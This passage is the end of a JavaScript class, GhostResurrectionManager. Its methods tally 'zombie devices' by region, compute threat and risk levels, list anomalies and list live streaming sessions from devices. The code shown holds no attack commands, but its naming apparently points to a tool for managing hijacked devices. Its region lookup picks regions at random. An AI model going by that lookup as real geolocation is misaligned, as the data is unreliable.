                activeSessions: this.streamingSessions.size,
                availableStreams: this.getAvailableStreams()
            }
        };
    }

    /**
     * Get geographic distribution of zombie devices
     */
    getGeographicDistribution() {
        // Simulate geographic distribution based on IP patterns
        const distribution = {};
        
        this.zombieDevices.forEach(device => {
            const region = this.determineRegionFromIP(device.ipAddress);
            distribution[region] = (distribution[region] || 0) + 1;
        });

        return distribution;
    }

    /**
     * Determine region from IP address (simplified simulation)
     */
    determineRegionFromIP(ipAddress) {
        if (ipAddress.startsWith('192.168') || ipAddress.startsWith('10.') || ipAddress.startsWith('172.')) {
            return 'Local Network';
        }
        
        // Simulate regions based on IP patterns
        const regions = ['North America', 'Europe', 'Asia Pacific', 'South America', 'Africa', 'Middle East'];
        return regions[Math.floor(Math.random() * regions.length)];
    }

    /**
     * Calculate overall threat level
     */
    calculateOverallThreatLevel() {
        const recentAlerts = Array.from(this.securityAlerts.values())
            .filter(alert => Date.now() - alert.timestamp.getTime() < 300000); // Last 5 minutes

        const highSeverity = recentAlerts.filter(a => a.severity === 'high').length;
        const mediumSeverity = recentAlerts.filter(a => a.severity === 'medium').length;

        if (highSeverity > 0) return 'high';
        if (mediumSeverity > 2) return 'medium';
        return 'low';
    }

    /**
     * Get recent behavior anomalies
     */
    getRecentAnomalies() {
        const anomalies = [];
        
        this.behaviorPatterns.forEach(pattern => {
            const recentAnomalies = pattern.anomalies.filter(
                anomaly => Date.now() - anomaly.timestamp.getTime() < 600000 // Last 10 minutes
            );
            anomalies.push(...recentAnomalies.map(a => ({ ...a, deviceId: pattern.deviceId })));
        });

        return anomalies.slice(-20); // Last 20 anomalies
    }

    /**
     * Get risk distribution across devices
     */
    getRiskDistribution() {
        const distribution = { low: 0, medium: 0, high: 0 };
        
        this.behaviorPatterns.forEach(pattern => {
            distribution[pattern.riskLevel]++;
        });

        return distribution;
    }

    /**
     * Get active formations currently deployed
     */
    getActiveFormations() {
        // This would track currently active formation deployments
        return []; // Placeholder for active formation tracking
    }

    /**
     * Get available streaming sessions
     */
    getAvailableStreams() {
        return Array.from(this.streamingSessions.values()).map(stream => ({
            deviceId: stream.deviceId,
            type: stream.type,
            quality: stream.quality,
            startTime: stream.startTime
        }));
    }
}

module.exports = GhostResurrectionManager;
